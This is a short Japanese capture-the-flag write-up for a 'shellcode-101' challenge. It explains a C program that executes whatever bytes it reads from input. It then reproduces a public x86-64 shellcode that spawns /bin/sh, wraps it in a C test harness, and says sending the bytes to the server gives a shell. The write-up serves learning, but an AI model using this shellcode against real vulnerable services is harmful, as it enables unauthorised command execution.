# shellcode-101

## / Overview

Shellcode Injection

## / Writeup

### ソースコード解析
提供されたCのコードを確認すると、次のメモリ操作が行われていることが分かります。

```c
void *addr = mmap(NULL, 0x100, PROT_WRITE|PROT_EXEC, 
                  MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
```

* `mmap`: メモリ領域を確保しています。
* `PROT_WRITE | PROT_EXEC`: 確保したメモリに対し、「書き込み」と「実行」の両方の権限を与えています。

```c
puts("Alpaca> ");
fgets(addr, 0x100, stdin);
((void(*)())addr)();
```

* `fgets`: 確保したアドレス `addr` に対して、入力を直接書き込んでいます。
* 関数キャスト: `addr` を関数として呼び出しています。

つまり、**送ったバイト列がそのままCPUの命令として実行される**という、Shellcode Injection の問題です。

### シェルコードの選定
x86-64アーキテクチャで `/bin/sh` を起動するシェルコードが必要です。
`shellcode` と検索して一番最初にヒットするサイトにペイロードが載っています。

> こちらです
>
> https://shell-storm.org/shellcode/files/shellcode-806.html

使い方の例として次のように紹介されています。

```c

#include <stdio.h>
#include <string.h>

char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main()
{
    printf("len:%d bytes\n", strlen(code));
    (*(void(*)()) code)();
    return 0;
}
```

まさに今回のチャレンジと同じです。このバイト列をコピーしてサーバに送信すると、シェルを取得できます。